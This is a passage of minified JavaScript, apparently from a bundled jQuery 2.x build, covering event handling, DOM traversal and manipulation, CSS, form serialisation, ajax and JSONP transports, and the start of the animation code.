null==e.pageX&&null!=n.clientX&&(r=e.target.ownerDocument||X,i=r.documentElement,o=r.body,e.pageX=n.clientX+(i&&i.scrollLeft||o&&o.scrollLeft||0)-(i&&i.clientLeft||o&&o.clientLeft||0),e.pageY=n.clientY+(i&&i.scrollTop||o&&o.scrollTop||0)-(i&&i.clientTop||o&&o.clientTop||0)),e.which||s===t||(e.which=1&s?1:2&s?3:4&s?2:0),e}},fix:function(e){if(e[ot.expando])return e;var t,n,r,i=e.type,o=e,s=this.fixHooks[i];for(s||(this.fixHooks[i]=s=kt.test(i)?this.mouseHooks:Nt.test(i)?this.keyHooks:{}),r=s.props?this.props.concat(s.props):this.props,e=new ot.Event(o),t=r.length;t--;)n=r[t],e[n]=o[n];return 3===e.target.nodeType&&(e.target=e.target.parentNode),s.filter?s.filter(e,o):e},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==u()&&this.focus?(this.focus(),!1):t},delegateType:"focusin"},blur:{trigger:function(){return this===u()&&this.blur?(this.blur(),!1):t},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&ot.nodeName(this,"input")?(this.click(),!1):t},_default:function(e){return ot.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){e.result!==t&&(e.originalEvent.returnValue=e.result)}}},simulate:function(e,t,n,r){var i=ot.extend(new ot.Event,n,{type:e,isSimulated:!0,originalEvent:{}});r?ot.event.trigger(i,null,t):ot.event.dispatch.call(t,i),i.isDefaultPrevented()&&n.preventDefault()}},ot.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n,!1)},ot.Event=function(e,n){return this instanceof ot.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||e.getPreventDefault&&e.getPreventDefault()?s:a):this.type=e,n&&ot.extend(this,n),this.timeStamp=e&&e.timeStamp||ot.now(),this[ot.expando]=!0,t):new ot.Event(e,n)},ot.Event.prototype={isDefaultPrevented:a,isPropagationStopped:a,isImmediatePropagationStopped:a,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=s,e&&e.preventDefault&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=s,e&&e.stopPropagation&&e.stopPropagation()},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=s,this.stopPropagation()}},ot.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(e,t){ot.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return(!i||i!==r&&!ot.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),ot.support.focusinBubbles||ot.each({focus:"focusin",blur:"focusout"},function(e,t){var n=0,r=function(e){ot.event.simulate(t,e.target,ot.event.fix(e),!0)};ot.event.special[t]={setup:function(){0===n++&&X.addEventListener(e,r,!0)},teardown:function(){0===--n&&X.removeEventListener(e,r,!0)}}}),ot.fn.extend({on:function(e,n,r,i,o){var s,u;if("object"==typeof e){"string"!=typeof n&&(r=r||n,n=t);for(u in e)this.on(u,n,r,e[u],o);return this}if(null==r&&null==i?(i=n,r=n=t):null==i&&("string"==typeof n?(i=r,r=t):(i=r,r=n,n=t)),i===!1)i=a;else if(!i)return this;return 1===o&&(s=i,i=function(e){return ot().off(e),s.apply(this,arguments)},i.guid=s.guid||(s.guid=ot.guid++)),this.each(function(){ot.event.add(this,e,i,r,n)})},one:function(e,t,n,r){return this.on(e,t,n,r,1)},off:function(e,n,r){var i,o;if(e&&e.preventDefault&&e.handleObj)return i=e.handleObj,ot(e.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof e){for(o in e)this.off(o,n,e[o]);return this}return(n===!1||"function"==typeof n)&&(r=n,n=t),r===!1&&(r=a),this.each(function(){ot.event.remove(this,e,r,n)})},trigger:function(e,t){return this.each(function(){ot.event.trigger(e,t,this)})},triggerHandler:function(e,n){var r=this[0];return r?ot.event.trigger(e,n,r,!0):t}});var jt=/^.[^:#\[\.,]*$/,Dt=ot.expr.match.needsContext,At={children:!0,contents:!0,next:!0,prev:!0};ot.fn.extend({find:function(e){var t,n,r,i=this.length;if("string"!=typeof e)return t=this,this.pushStack(ot(e).filter(function(){for(r=0;i>r;r++)if(ot.contains(t[r],this))return!0}));for(n=[],r=0;i>r;r++)ot.find(e,this[r],n);return n=this.pushStack(i>1?ot.unique(n):n),n.selector=(this.selector?this.selector+" ":"")+e,n},has:function(e){var t=ot(e,this),n=t.length;return this.filter(function(){for(var e=0;n>e;e++)if(ot.contains(this,t[e]))return!0})},not:function(e){return this.pushStack(l(this,e||[],!0))},filter:function(e){return this.pushStack(l(this,e||[],!1))},is:function(e){return!!e&&("string"==typeof e?Dt.test(e)?ot(e,this.context).index(this[0])>=0:ot.filter(e,this).length>0:this.filter(e).length>0)},closest:function(e,t){for(var n,r=0,i=this.length,o=[],s=Dt.test(e)||"string"!=typeof e?ot(e,t||this.context):0;i>r;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(11>n.nodeType&&(s?s.index(n)>-1:1===n.nodeType&&ot.find.matchesSelector(n,e))){n=o.push(n);break}return this.pushStack(o.length>1?ot.unique(o):o)},index:function(e){return e?"string"==typeof e?tt.call(ot(e),this[0]):tt.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){var n="string"==typeof e?ot(e,t):ot.makeArray(e&&e.nodeType?[e]:e),r=ot.merge(this.get(),n);return this.pushStack(ot.unique(r))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),ot.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return ot.dir(e,"parentNode")},parentsUntil:function(e,t,n){return ot.dir(e,"parentNode",n)},next:function(e){return c(e,"nextSibling")},prev:function(e){return c(e,"previousSibling")},nextAll:function(e){return ot.dir(e,"nextSibling")},prevAll:function(e){return ot.dir(e,"previousSibling")},nextUntil:function(e,t,n){return ot.dir(e,"nextSibling",n)},prevUntil:function(e,t,n){return ot.dir(e,"previousSibling",n)},siblings:function(e){return ot.sibling((e.parentNode||{}).firstChild,e)},children:function(e){return ot.sibling(e.firstChild)},contents:function(e){return ot.nodeName(e,"iframe")?e.contentDocument||e.contentWindow.document:ot.merge([],e.childNodes)}},function(e,t){ot.fn[e]=function(n,r){var i=ot.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=ot.filter(r,i)),this.length>1&&(At[e]||ot.unique(i),"p"===e[0]&&i.reverse()),this.pushStack(i)}}),ot.extend({filter:function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?ot.find.matchesSelector(r,e)?[r]:[]:ot.find.matches(e,ot.grep(t,function(e){return 1===e.nodeType}))},dir:function(e,n,r){for(var i=[],o=r!==t;(e=e[n])&&9!==e.nodeType;)if(1===e.nodeType){if(o&&ot(e).is(r))break;i.push(e)}return i},sibling:function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n}});var Lt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,qt=/<([\w:]+)/,Ht=/<|&#?\w+;/,Ot=/<(?:script|style|link)/i,Ft=/^(?:checkbox|radio)$/i,Pt=/checked\s*(?:[^=]|=\s*.checked.)/i,Mt=/^$|\/(?:java|ecma)script/i,Rt=/^true\/(.*)/,Wt=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,Bt={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};Bt.optgroup=Bt.option,Bt.tbody=Bt.tfoot=Bt.colgroup=Bt.caption=Bt.col=Bt.thead,Bt.th=Bt.td,ot.fn.extend({text:function(e){return ot.access(this,function(e){return e===t?ot.text(this):this.empty().append((this[0]&&this[0].ownerDocument||X).createTextNode(e))},null,e,arguments.length)},append:function(){return this.domManip(arguments,!0,function(e){(1===this.nodeType||11===this.nodeType||9===this.nodeType)&&this.appendChild(e)})},prepend:function(){return this.domManip(arguments,!0,function(e){(1===this.nodeType||11===this.nodeType||9===this.nodeType)&&this.insertBefore(e,this.firstChild)})},before:function(){return this.domManip(arguments,!1,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return this.domManip(arguments,!1,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},remove:function(e,t){for(var n,r=e?ot.filter(e,this):this,i=r.length;i--;)n=r[i],t||1!==n.nodeType||ot.cleanData(m(n)),n.parentNode&&(t&&ot.contains(n.ownerDocument,n)&&h(m(n,"script")),n.parentNode.removeChild(n));return this},empty:function(){for(var e,t=0,n=this.length;n>t;t++)e=this[t],1===e.nodeType&&(ot.cleanData(m(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null==e?!1:e,t=null==t?e:t,this.map(function(){return ot.clone(this,e,t)})},html:function(e){return ot.access(this,function(e){var n=this[0]||{},r=0,i=this.length;if(e===t&&1===n.nodeType)return n.innerHTML;if("string"==typeof e&&!Ot.test(e)&&!Bt[(qt.exec(e)||["",""])[1].toLowerCase()]){e=e.replace(Lt,"<$1></$2>");try{for(;i>r;r++)n=this[r]||{},1===n.nodeType&&(ot.cleanData(m(n,!1)),n.innerHTML=e);n=0}catch(o){}}n&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(e){var t=ot.isFunction(e);return t||"string"==typeof e||(e=ot(e).not(this).detach()),""!==e?this.domManip([e],!0,function(e){var t=this.nextSibling,n=this.parentNode;n&&(ot(this).remove(),n.insertBefore(e,t))}):this.remove()},detach:function(e){return this.remove(e,!0)},domManip:function(e,n,r){e=K.apply([],e);var i,o,s,a,u,c,l=0,h=this.length,g=this,y=h-1,v=e[0],x=ot.isFunction(v);if(x||!(1>=h||"string"!=typeof v||ot.support.checkClone)&&Pt.test(v))return this.each(function(i){var o=g.eq(i);x&&(e[0]=v.call(this,i,n?o.html():t)),o.domManip(e,n,r)});if(h&&(i=ot.buildFragment(e,this[0].ownerDocument,!1,this),o=i.firstChild,1===i.childNodes.length&&(i=o),o)){for(n=n&&ot.nodeName(o,"tr"),s=ot.map(m(i,"script"),p),a=s.length;h>l;l++)u=i,l!==y&&(u=ot.clone(u,!0,!0),a&&ot.merge(s,m(u,"script"))),r.call(n&&ot.nodeName(this[l],"table")?f(this[l],"tbody"):this[l],u,l);if(a)for(c=s[s.length-1].ownerDocument,ot.map(s,d),l=0;a>l;l++)u=s[l],Mt.test(u.type||"")&&!mt.access(u,"globalEval")&&ot.contains(c,u)&&(u.src?ot.ajax({url:u.src,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0}):ot.globalEval(u.textContent.replace(Wt,"")))}return this}}),ot.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){ot.fn[e]=function(e){for(var n,r=[],i=ot(e),o=i.length-1,s=0;o>=s;s++)n=s===o?this:this.clone(!0),ot(i[s])[t](n),Z.apply(r,n.get());return this.pushStack(r)}}),ot.extend({clone:function(e,t,n){var r,i,o,s,a=e.cloneNode(!0),u=ot.contains(e.ownerDocument,e);if(!(ot.support.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||ot.isXMLDoc(e)))for(s=m(a),o=m(e),r=0,i=o.length;i>r;r++)y(o[r],s[r]);if(t)if(n)for(o=o||m(e),s=s||m(a),r=0,i=o.length;i>r;r++)g(o[r],s[r]);else g(e,a);return s=m(a,"script"),s.length>0&&h(s,!u&&m(e,"script")),a},buildFragment:function(e,t,n,r){for(var i,o,s,a,u,c,l=0,f=e.length,p=t.createDocumentFragment(),d=[];f>l;l++)if(i=e[l],i||0===i)if("object"===ot.type(i))ot.merge(d,i.nodeType?[i]:i);else if(Ht.test(i)){for(o=o||p.appendChild(t.createElement("div")),s=(qt.exec(i)||["",""])[1].toLowerCase(),a=Bt[s]||Bt._default,o.innerHTML=a[1]+i.replace(Lt,"<$1></$2>")+a[2],c=a[0];c--;)o=o.firstChild;ot.merge(d,o.childNodes),o=p.firstChild,o.textContent=""}else d.push(t.createTextNode(i));for(p.textContent="",l=0;i=d[l++];)if((!r||-1===ot.inArray(i,r))&&(u=ot.contains(i.ownerDocument,i),o=m(p.appendChild(i),"script"),u&&h(o),n))for(c=0;i=o[c++];)Mt.test(i.type||"")&&n.push(i);return p},cleanData:function(e){for(var t,n,r,i=e.length,o=0,s=ot.event.special;i>o;o++){if(n=e[o],ot.acceptData(n)&&(t=mt.access(n)))for(r in t.events)s[r]?ot.event.remove(n,r):ot.removeEvent(n,r,t.handle);gt.discard(n),mt.discard(n)}}}),ot.fn.extend({wrapAll:function(e){var t;return ot.isFunction(e)?this.each(function(t){ot(this).wrapAll(e.call(this,t))}):(this[0]&&(t=ot(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){for(var e=this;e.firstElementChild;)e=e.firstElementChild;return e}).append(this)),this)},wrapInner:function(e){return ot.isFunction(e)?this.each(function(t){ot(this).wrapInner(e.call(this,t))}):this.each(function(){var t=ot(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=ot.isFunction(e);return this.each(function(n){ot(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(){return this.parent().each(function(){ot.nodeName(this,"body")||ot(this).replaceWith(this.childNodes)}).end()}});var $t,It,zt=/^(none|table(?!-c[ea]).+)/,_t=/^margin/,Xt=RegExp("^("+st+")(.*)$","i"),Ut=RegExp("^("+st+")(?!px)[a-z%]+$","i"),Yt=RegExp("^([+-])=("+st+")","i"),Vt={BODY:"block"},Gt={position:"absolute",visibility:"hidden",display:"block"},Jt={letterSpacing:0,fontWeight:400},Qt=["Top","Right","Bottom","Left"],Kt=["Webkit","O","Moz","ms"];ot.fn.extend({css:function(e,n){return ot.access(this,function(e,n,r){var i,o,s={},a=0;if(ot.isArray(n)){for(i=b(e),o=n.length;o>a;a++)s[n[a]]=ot.css(e,n[a],!1,i);return s}return r!==t?ot.style(e,n,r):ot.css(e,n)},e,n,arguments.length>1)},show:function(){return w(this,!0)},hide:function(){return w(this)},toggle:function(e){var t="boolean"==typeof e;return this.each(function(){(t?e:x(this))?ot(this).show():ot(this).hide()})}}),ot.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=$t(e,"opacity");return""===n?"1":n}}}},cssNumber:{columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":"cssFloat"},style:function(e,n,r,i){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var o,s,a,u=ot.camelCase(n),c=e.style;return n=ot.cssProps[u]||(ot.cssProps[u]=v(c,u)),a=ot.cssHooks[n]||ot.cssHooks[u],r===t?a&&"get"in a&&(o=a.get(e,!1,i))!==t?o:c[n]:(s=typeof r,"string"===s&&(o=Yt.exec(r))&&(r=(o[1]+1)*o[2]+parseFloat(ot.css(e,n)),s="number"),null==r||"number"===s&&isNaN(r)||("number"!==s||ot.cssNumber[u]||(r+="px"),ot.support.clearCloneStyle||""!==r||0!==n.indexOf("background")||(c[n]="inherit"),a&&"set"in a&&(r=a.set(e,r,i))===t||(c[n]=r)),t)}},css:function(e,n,r,i){var o,s,a,u=ot.camelCase(n);return n=ot.cssProps[u]||(ot.cssProps[u]=v(e.style,u)),a=ot.cssHooks[n]||ot.cssHooks[u],a&&"get"in a&&(o=a.get(e,!0,r)),o===t&&(o=$t(e,n,i)),"normal"===o&&n in Jt&&(o=Jt[n]),""===r||r?(s=parseFloat(o),r===!0||ot.isNumeric(s)?s||0:o):o}}),$t=function(e,n,r){var i,o,s,a=r||b(e),u=a?a.getPropertyValue(n)||a[n]:t,c=e.style;return a&&(""!==u||ot.contains(e.ownerDocument,e)||(u=ot.style(e,n)),Ut.test(u)&&_t.test(n)&&(i=c.width,o=c.minWidth,s=c.maxWidth,c.minWidth=c.maxWidth=c.width=u,u=a.width,c.width=i,c.minWidth=o,c.maxWidth=s)),u},ot.each(["height","width"],function(e,n){ot.cssHooks[n]={get:function(e,r,i){return r?0===e.offsetWidth&&zt.test(ot.css(e,"display"))?ot.swap(e,Gt,function(){return N(e,n,i)}):N(e,n,i):t},set:function(e,t,r){var i=r&&b(e);return T(e,t,r?C(e,n,r,ot.support.boxSizing&&"border-box"===ot.css(e,"boxSizing",!1,i),i):0)}}}),ot(function(){ot.support.reliableMarginRight||(ot.cssHooks.marginRight={get:function(e,n){return n?ot.swap(e,{display:"inline-block"},$t,[e,"marginRight"]):t}}),!ot.support.pixelPosition&&ot.fn.position&&ot.each(["top","left"],function(e,n){ot.cssHooks[n]={get:function(e,r){return r?(r=$t(e,n),Ut.test(r)?ot(e).position()[n]+"px":r):t}}})}),ot.expr&&ot.expr.filters&&(ot.expr.filters.hidden=function(e){return 0>=e.offsetWidth&&0>=e.offsetHeight},ot.expr.filters.visible=function(e){return!ot.expr.filters.hidden(e)}),ot.each({margin:"",padding:"",border:"Width"},function(e,t){ot.cssHooks[e+t]={expand:function(n){for(var r=0,i={},o="string"==typeof n?n.split(" "):[n];4>r;r++)i[e+Qt[r]+t]=o[r]||o[r-2]||o[0];return i}},_t.test(e)||(ot.cssHooks[e+t].set=T)});var Zt=/%20/g,en=/\[\]$/,tn=/\r?\n/g,nn=/^(?:submit|button|image|reset|file)$/i,rn=/^(?:input|select|textarea|keygen)/i;ot.fn.extend({serialize:function(){return ot.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=ot.prop(this,"elements");return e?ot.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!ot(this).is(":disabled")&&rn.test(this.nodeName)&&!nn.test(e)&&(this.checked||!Ft.test(e))}).map(function(e,t){var n=ot(this).val();return null==n?null:ot.isArray(n)?ot.map(n,function(e){return{name:t.name,value:e.replace(tn,"\r\n")}}):{name:t.name,value:n.replace(tn,"\r\n")}}).get()}}),ot.param=function(e,n){var r,i=[],o=function(e,t){t=ot.isFunction(t)?t():null==t?"":t,i[i.length]=encodeURIComponent(e)+"="+encodeURIComponent(t)};if(n===t&&(n=ot.ajaxSettings&&ot.ajaxSettings.traditional),ot.isArray(e)||e.jquery&&!ot.isPlainObject(e))ot.each(e,function(){o(this.name,this.value)});else for(r in e)S(r,e[r],n,o);return i.join("&").replace(Zt,"+")},ot.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(e,t){ot.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),ot.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)},bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}});var on,sn,an=ot.now(),un=/\?/,cn=/#.*$/,ln=/([?&])_=[^&]*/,fn=/^(.*?):[ \t]*([^\r\n]*)$/gm,pn=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,dn=/^(?:GET|HEAD)$/,hn=/^\/\//,gn=/^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,mn=ot.fn.load,yn={},vn={},xn="*/".concat("*");try{sn=_.href}catch(bn){sn=X.createElement("a"),sn.href="",sn=sn.href}on=gn.exec(sn.toLowerCase())||[],ot.fn.load=function(e,n,r){if("string"!=typeof e&&mn)return mn.apply(this,arguments);var i,o,s,a=this,u=e.indexOf(" ");return u>=0&&(i=e.slice(u),e=e.slice(0,u)),ot.isFunction(n)?(r=n,n=t):n&&"object"==typeof n&&(o="POST"),a.length>0&&ot.ajax({url:e,type:o,dataType:"html",data:n}).done(function(e){s=arguments,a.html(i?ot("<div>").append(ot.parseHTML(e)).find(i):e)}).complete(r&&function(e,t){a.each(r,s||[e.responseText,t,e])}),this},ot.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){ot.fn[t]=function(e){return this.on(t,e)}}),ot.each(["get","post"],function(e,n){ot[n]=function(e,r,i,o){return ot.isFunction(r)&&(o=o||i,i=r,r=t),ot.ajax({url:e,type:n,dataType:o,data:r,success:i})}}),ot.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:sn,type:"GET",isLocal:pn.test(on[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":xn,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":ot.parseJSON,"text xml":ot.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?A(A(e,ot.ajaxSettings),t):A(ot.ajaxSettings,e)},ajaxPrefilter:j(yn),ajaxTransport:j(vn),ajax:function(e,n){function r(e,n,r,a){var c,f,v,x,w,C=n;2!==b&&(b=2,u&&clearTimeout(u),i=t,s=a||"",T.readyState=e>0?4:0,c=e>=200&&300>e||304===e,r&&(x=L(p,T,r)),x=q(p,x,T,c),c?(p.ifModified&&(w=T.getResponseHeader("Last-Modified"),w&&(ot.lastModified[o]=w),w=T.getResponseHeader("etag"),w&&(ot.etag[o]=w)),204===e?C="nocontent":304===e?C="notmodified":(C=x.state,f=x.data,v=x.error,c=!v)):(v=C,(e||!C)&&(C="error",0>e&&(e=0))),T.status=e,T.statusText=(n||C)+"",c?g.resolveWith(d,[f,C,T]):g.rejectWith(d,[T,C,v]),T.statusCode(y),y=t,l&&h.trigger(c?"ajaxSuccess":"ajaxError",[T,p,c?f:v]),m.fireWith(d,[T,C]),l&&(h.trigger("ajaxComplete",[T,p]),--ot.active||ot.event.trigger("ajaxStop")))}"object"==typeof e&&(n=e,e=t),n=n||{};var i,o,s,a,u,c,l,f,p=ot.ajaxSetup({},n),d=p.context||p,h=p.context&&(d.nodeType||d.jquery)?ot(d):ot.event,g=ot.Deferred(),m=ot.Callbacks("once memory"),y=p.statusCode||{},v={},x={},b=0,w="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(2===b){if(!a)for(a={};t=fn.exec(s);)a[t[1].toLowerCase()]=t[2];t=a[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return 2===b?s:null},setRequestHeader:function(e,t){var n=e.toLowerCase();return b||(e=x[n]=x[n]||e,v[e]=t),this},overrideMimeType:function(e){return b||(p.mimeType=e),this},statusCode:function(e){var t;if(e)if(2>b)for(t in e)y[t]=[y[t],e[t]];else T.always(e[T.status]);return this},abort:function(e){var t=e||w;return i&&i.abort(t),r(0,t),this}};if(g.promise(T).complete=m.add,T.success=T.done,T.error=T.fail,p.url=((e||p.url||sn)+"").replace(cn,"").replace(hn,on[1]+"//"),p.type=n.method||n.type||p.method||p.type,p.dataTypes=ot.trim(p.dataType||"*").toLowerCase().match(at)||[""],null==p.crossDomain&&(c=gn.exec(p.url.toLowerCase()),p.crossDomain=!(!c||c[1]===on[1]&&c[2]===on[2]&&(c[3]||("http:"===c[1]?"80":"443"))===(on[3]||("http:"===on[1]?"80":"443")))),p.data&&p.processData&&"string"!=typeof p.data&&(p.data=ot.param(p.data,p.traditional)),D(yn,p,n,T),2===b)return T;l=p.global,l&&0===ot.active++&&ot.event.trigger("ajaxStart"),p.type=p.type.toUpperCase(),p.hasContent=!dn.test(p.type),o=p.url,p.hasContent||(p.data&&(o=p.url+=(un.test(o)?"&":"?")+p.data,delete p.data),p.cache===!1&&(p.url=ln.test(o)?o.replace(ln,"$1_="+an++):o+(un.test(o)?"&":"?")+"_="+an++)),p.ifModified&&(ot.lastModified[o]&&T.setRequestHeader("If-Modified-Since",ot.lastModified[o]),ot.etag[o]&&T.setRequestHeader("If-None-Match",ot.etag[o])),(p.data&&p.hasContent&&p.contentType!==!1||n.contentType)&&T.setRequestHeader("Content-Type",p.contentType),T.setRequestHeader("Accept",p.dataTypes[0]&&p.accepts[p.dataTypes[0]]?p.accepts[p.dataTypes[0]]+("*"!==p.dataTypes[0]?", "+xn+"; q=0.01":""):p.accepts["*"]);for(f in p.headers)T.setRequestHeader(f,p.headers[f]);if(p.beforeSend&&(p.beforeSend.call(d,T,p)===!1||2===b))return T.abort();w="abort";for(f in{success:1,error:1,complete:1})T[f](p[f]);if(i=D(vn,p,n,T)){T.readyState=1,l&&h.trigger("ajaxSend",[T,p]),p.async&&p.timeout>0&&(u=setTimeout(function(){T.abort("timeout")},p.timeout));try{b=1,i.send(v,r)}catch(C){if(!(2>b))throw C;r(-1,C)}}else r(-1,"No Transport");return T},getScript:function(e,n){return ot.get(e,t,n,"script")},getJSON:function(e,t,n){return ot.get(e,t,n,"json")}}),ot.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(e){return ot.globalEval(e),e}}}),ot.ajaxPrefilter("script",function(e){e.cache===t&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),ot.ajaxTransport("script",function(e){if(e.crossDomain){var t,n;return{send:function(r,i){t=ot("<script>").prop({async:!0,charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&i("error"===e.type?404:200,e.type)}),X.head.appendChild(t[0])},abort:function(){n&&n()}}}});var wn=[],Tn=/(=)\?(?=&|$)|\?\?/;ot.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=wn.pop()||ot.expando+"_"+an++;return this[e]=!0,e}}),ot.ajaxPrefilter("json jsonp",function(n,r,i){var o,s,a,u=n.jsonp!==!1&&(Tn.test(n.url)?"url":"string"==typeof n.data&&!(n.contentType||"").indexOf("application/x-www-form-urlencoded")&&Tn.test(n.data)&&"data");return u||"jsonp"===n.dataTypes[0]?(o=n.jsonpCallback=ot.isFunction(n.jsonpCallback)?n.jsonpCallback():n.jsonpCallback,u?n[u]=n[u].replace(Tn,"$1"+o):n.jsonp!==!1&&(n.url+=(un.test(n.url)?"&":"?")+n.jsonp+"="+o),n.converters["script json"]=function(){return a||ot.error(o+" was not called"),a[0]},n.dataTypes[0]="json",s=e[o],e[o]=function(){a=arguments},i.always(function(){e[o]=s,n[o]&&(n.jsonpCallback=r.jsonpCallback,wn.push(o)),a&&ot.isFunction(s)&&s(a[0]),a=s=t}),"script"):t}),ot.ajaxSettings.xhr=function(){try{return new XMLHttpRequest}catch(e){}};var Cn=ot.ajaxSettings.xhr(),Nn={0:200,1223:204},kn=0,En={};e.ActiveXObject&&ot(e).on("unload",function(){for(var e in En)En[e]();En=t}),ot.support.cors=!!Cn&&"withCredentials"in Cn,ot.support.ajax=Cn=!!Cn,ot.ajaxTransport(function(e){var n;return ot.support.cors||Cn&&!e.crossDomain?{send:function(r,i){var o,s,a=e.xhr();if(a.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(o in e.xhrFields)a[o]=e.xhrFields[o];e.mimeType&&a.overrideMimeType&&a.overrideMimeType(e.mimeType),e.crossDomain||r["X-Requested-With"]||(r["X-Requested-With"]="XMLHttpRequest");for(o in r)a.setRequestHeader(o,r[o]);n=function(e){return function(){n&&(delete En[s],n=a.onload=a.onerror=null,"abort"===e?a.abort():"error"===e?i(a.status||404,a.statusText):i(Nn[a.status]||a.status,a.statusText,"string"==typeof a.responseText?{text:a.responseText}:t,a.getAllResponseHeaders()))}},a.onload=n(),a.onerror=n("error"),n=En[s=kn++]=n("abort"),a.send(e.hasContent&&e.data||null)},abort:function(){n&&n()}}:t});var Sn,jn,Dn=/^(?:toggle|show|hide)$/,An=RegExp("^(?:([+-])=|)("+st+")([a-z%]*)$","i"),Ln=/queueHooks$/,qn=[M],Hn={"*":[function(e,t){var n,r,i=this.createTween(e,t),o=An.exec(t),s=i.cur(),a=+s||0,u=1,c=20;if(o){if(n=+o[2],r=o[3]||(ot.cssNumber[e]?"":"px"),"px"!==r&&a){a=ot.css(i.elem,e,!0)||n||1;do u=u||".5",a/=u,ot.style(i.elem,e,a+r);while(u!==(u=i.cur()/s)&&1!==u&&--c)}i.unit=r,i.start=a,i.end=o[1]?a+(o[1]+1)*n:n}return i}]};ot.Animation=ot.extend(F,{tweener:function(e,t){ot.isFunction(e)?(t=e,e=["*"]):e=e.split(" ");for(var n,r=0,i=e.length;i>r;r++)n=e[r],Hn[n]=Hn[n]||[],Hn[n].unshift(t)},prefilter:function(e,t){t?qn.unshift(e):qn.push(e)}}),ot.Tween=R,R.prototype={constructor:R,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||"swing",this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(ot.cssNumber[n]?"":"px")},cur:function(){var e=R.propHooks[this.prop];return e&&e.get?e.get(this):R.propHooks._default.get(this)},run:function(e){var t,n=R.propHooks[this.prop];return this.pos=t=this.options.duration?ot.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):R.propHooks._default.set(this),this}},R.prototype.init.prototype=R.prototype,R.propHooks={_default:{get:function(e){var t;return 